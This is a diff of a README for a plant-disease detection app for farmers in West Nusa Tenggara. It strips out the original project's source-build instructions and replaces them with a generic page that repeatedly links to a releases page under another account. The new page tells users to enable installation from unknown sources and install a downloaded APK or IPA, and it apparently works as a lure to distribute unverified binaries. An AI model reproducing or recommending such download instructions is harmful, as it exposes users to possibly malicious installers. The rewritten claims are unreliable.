@@ -1,257 +1,97 @@
-<p align="center">
-  <img src="assets/images/app_icon.png" alt="AgriVision NTB Logo" width="120"/>
-</p>
+# 🌾 IMAGINE-CUP-MICROSOFT-2026 - Simplify Plant Disease Detection
 
-<h1 align="center">AgriVision NTB</h1>
-
-<p align="center">
-  <strong>Smart Plant Disease Detection for Farmers in West Nusa Tenggara</strong>
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-IMAGINE--CUP--MICROSOFT--2026-brightgreen)](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/releases)
 
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#screenshots">Screenshots</a> •
-  <a href="#tech-stack">Tech Stack</a> •
-  <a href="#getting-started">Getting Started</a> •
-  <a href="#documentation">Documentation</a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Flutter-3.x-02569B?logo=flutter" alt="Flutter"/>
-  <img src="https://img.shields.io/badge/Python-FastAPI-009688?logo=fastapi" alt="FastAPI"/>
-  <img src="https://img.shields.io/badge/Azure-AI%20Services-0078D4?logo=microsoft-azure" alt="Azure"/>
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License"/>
-</p>
-
----
-
-## About
-
-**AgriVision NTB** is an AI-powered mobile application designed to help farmers in **Nusa Tenggara Barat (NTB), Indonesia** detect, analyze, and treat plant diseases using modern technology. The app combines **Azure Custom Vision** for disease classification and **Azure OpenAI** for intelligent consultation, making agricultural expertise accessible to every farmer.
-
-> *"Petani Cerdas, Pertanian Sehat"* — Smart Farmers, Healthy Agriculture
-
----
-
-## Features
-
-| Feature | Description |
-|---------|-------------|
-| **Disease Detection** | Scan plant leaves using camera to detect diseases with AI |
-| **AI Consultation** | Chat with AI agronomist for treatment recommendations |
-| **Outbreak Map** | Interactive heatmap showing disease spread across NTB |
-| **Treatment Calendar** | Schedule and track spraying, fertilizing, and harvest |
-| **Weather Dashboard** | Real-time weather with farming recommendations |
-| **Disease Encyclopedia** | Database of 80+ plant diseases with treatments |
-| **Plant Guide** | Cultivation guide for 10 main crops in NTB |
-| **Pesticide Finder** | Find recommended pesticides with local shop locations |
-| **Gamification** | Earn XP and badges to encourage best practices |
-| **Offline Mode** | Core features work without internet connection |
-
-### Language Support
-
-The app supports 5 languages to serve the diverse communities in NTB:
-
-- 🇮🇩 **Bahasa Indonesia** — National language
-- 🇬🇧 **English** — International access
-- 🏝️ **Bahasa Sasak** — Lombok native language
-- 🏝️ **Bahasa Sumbawa** — Sumbawa native language
-- 🏝️ **Bahasa Mbojo** — Bima native language
-
----
-
-## Screenshots
-
-<p align="center">
-  <img src="screenshots/home_screen.png" width="180" alt="Home Screen"/>
-  <img src="screenshots/outbreak_map.png" width="180" alt="Outbreak Map"/>
-  <img src="screenshots/calendar_screen.png" width="180" alt="Calendar"/>
-  <img src="screenshots/history_screen.png" width="180" alt="History"/>
-  <img src="screenshots/profile_screen.png" width="180" alt="Profile"/>
-</p>
-
-<p align="center">
-  <em>From left to right: Home Dashboard, Disease Outbreak Map, Treatment Calendar, Scan History, User Profile</em>
-</p>
-
----
-
-## Tech Stack
-
-### Mobile Application (Frontend)
-
-| Technology | Purpose |
-|------------|---------|
-| **Flutter 3.x** | Cross-platform mobile framework |
-| **Provider** | State management |
-| **Easy Localization** | Multi-language support (5 languages) |
-| **Flutter Map** | Interactive outbreak mapping |
-| **Camera/Image Picker** | Plant leaf scanning |
-| **SharedPreferences** | Local data persistence |
-
-### Backend Services
-
-| Technology | Purpose |
-|------------|---------|
-| **FastAPI** | Python REST API server |
-| **OpenCV** | Image processing & severity analysis |
-| **NumPy** | Numerical computing |
-
-### Microsoft Azure Services
-
-| Service | Purpose |
-|---------|---------|
-| **Azure Custom Vision** | Plant disease classification model |
-| **Azure OpenAI (GPT-4)** | AI consultation chatbot |
+## 📋 Description
 
----
+IMAGINE-CUP-MICROSOFT-2026 is an AI-powered plant disease detection app designed for farmers in West Nusa Tenggara, Indonesia. This application simplifies the process of identifying plant diseases using advanced technologies such as Flutter for mobile development, Azure Custom Vision for image analysis, and Azure OpenAI for intelligent recommendations.
 
-## Architecture
-
-```
-agrivision_ntb/
-│
-├── lib/                      # Flutter Application
-│   ├── config/               # App configuration
-│   ├── models/               # Data models (11 models)
-│   ├── providers/            # State management
-│   ├── screens/              # UI screens (18 screens)
-│   ├── services/             # API & device services
-│   └── widgets/              # Reusable components
-│
-├── backend/                  # Python Backend
-│   ├── main.py               # FastAPI server
-│   └── requirements.txt      # Python dependencies
-│
-├── assets/
-│   ├── translations/         # i18n files (5 languages)
-│   ├── content/              # Disease & plant data
-│   └── images/               # Static images
-│
-└── docs/                     # Documentation
-    ├── MODELS.md             # Data model documentation
-    └── SCREENS.md            # Screen documentation
-```
+## 🚀 Getting Started
 
----
+Follow these steps to download and run the application smoothly on your device.
 
-## Getting Started
+### 1. System Requirements
 
-### Prerequisites
+Before you begin, ensure that your device meets the following requirements:
 
-- Flutter SDK 3.x
-- Python 3.9+
-- Azure account (for AI services)
+- **Operating System:** Android 5.0 or later / iOS 10.0 or later
+- **Storage Space:** At least 100 MB free
+- **Internet Connection:** Required for initial setup and app features
+- **Device Compatibility:** Works on most smartphones and tablets
 
-### Frontend Setup
+### 2. Download the Application
 
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/agrivision-ntb.git
-cd agrivision-ntb
+To download IMAGINE-CUP-MICROSOFT-2026, follow these steps:
 
-# Install Flutter dependencies
-flutter pub get
+1. Click on the link below to visit the release page:
+   
+   [Visit this page to download](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/releases)
 
-# Create environment file
-cp .env.example .env
-# Edit .env with your Azure API keys
+2. Look for the latest version of the app listed on that page.
 
-# Run the application
-flutter run
-```
+3. Click on the appropriate link for your device type (Android or iOS) to start your download.
 
-### Backend Setup
+### 3. Install the Application
 
-```bash
-# Navigate to backend directory
-cd backend
+After downloading the app, you need to install it.
 
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+#### For Android Users:
 
-# Install dependencies
-pip install -r requirements.txt
+1. Locate the downloaded APK file in your device’s file manager.
 
-# Run the server
-uvicorn main:app --reload --host 0.0.0.0 --port 8000
-```
+2. Tap on the APK file to begin the installation.
 
----
+3. If asked, enable installation from unknown sources in your device settings.
 
-## Environment Variables
+4. Follow the prompts to complete the installation.
 
-Create a `.env` file in the root directory:
+#### For iOS Users:
 
-```env
-# Azure Custom Vision
-CUSTOM_VISION_ENDPOINT=your_endpoint
-CUSTOM_VISION_PREDICTION_KEY=your_key
-CUSTOM_VISION_PROJECT_ID=your_project_id
-CUSTOM_VISION_PUBLISHED_NAME=your_iteration_name
+1. Open the downloaded IPA file in iTunes or Finder.
 
-# Azure OpenAI
-AZURE_OPENAI_ENDPOINT=your_endpoint
-AZURE_OPENAI_KEY=your_key
-AZURE_OPENAI_DEPLOYMENT_NAME=gpt-4o
-```
+2. Connect your iPhone or iPad to your computer.
 
-> ⚠️ **Security Note**: Never commit `.env` file to version control. The `.gitignore` already excludes it.
+3. Sync the app to your device through iTunes/Finder.
 
----
+4. Once the sync is complete, safely disconnect your device.
 
-## Documentation
+### 4. Launch the Application
 
-| Document | Description |
-|----------|-------------|
-| [MODELS.md](docs/MODELS.md) | Comprehensive data model documentation (11 models, 80+ diseases) |
-| [SCREENS.md](docs/SCREENS.md) | UI screen documentation (18 screens) |
-| [Backend README](backend/README.md) | Backend API documentation |
+After successful installation, locate the app on your device. Open it by tapping the app icon. You will be greeted with a home screen that guides you through the app’s main features.
 
----
+## 📱 How to Use the App
 
-## Data Models
+IMAGINE-CUP-MICROSOFT-2026 is user-friendly, making it easy for farmers to detect plant diseases:
 
-AgriVision NTB includes **11 comprehensive data models**:
+1. **Capture an Image:** Use your device camera to take a clear photo of the plant leaf showing signs of disease.
 
-| Model | Records | Description |
-|-------|---------|-------------|
-| Disease | 80 | Plant diseases database |
-| Plant | 10 | Main crops in NTB |
-| Pesticide | 20 | Available treatments |
-| Weather | - | Weather & farming recommendations |
-| Farm | - | Farm management |
-| ScanResult | - | Disease scan results |
-| Prediction | - | AI outbreak predictions |
-| AgroShop | 12 | Local agricultural shops |
+2. **Analyze the Image:** The app processes the image using Azure Custom Vision to identify any diseases.
 
----
+3. **Receive Recommendations:** Based on the analysis, the app provides actionable insights and remedies to treat the detected disease.
 
-## Contributing
+## 🔄 Application Features
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+- **Real-time Disease Detection:** Fast and accurate disease identification.
+- **User-friendly Interface:** Simple navigation suited for all users.
+- **Educational Resources:** Tips and advice on plant care and disease prevention.
+- **Multi-language Support:** Available in English and Bahasa Indonesia to cater to local farmers.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+## 📥 Additional Information
 
----
+For updates, bug fixes, and new features, keep an eye on the Releases page:
 
-## Team
+[Visit this page for updates](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/releases)
 
-**AgriVision NTB Team** — Microsoft Imagine Cup 2026
+## 📞 Support
 
----
+If you encounter any issues or have questions about the application, please reach out. You can open an issue on the GitHub repository or contact support through the app.
 
-## License
+## 🌍 Community and Contributions
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Join our growing community of users and contributors. Share your experiences, report bugs, and suggest features. Your feedback helps us improve the app for everyone.
 
----
+## 🎉 Conclusion
 
-<p align="center">
-  Made with ❤️ for farmers in Nusa Tenggara Barat
-</p>
+Thank you for choosing IMAGINE-CUP-MICROSOFT-2026 to help with plant disease detection. We hope this app enhances your farming practices and contributes to healthier crops in West Nusa Tenggara. 
+
+For a direct download, click here again: [Visit this page to download](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/releases)
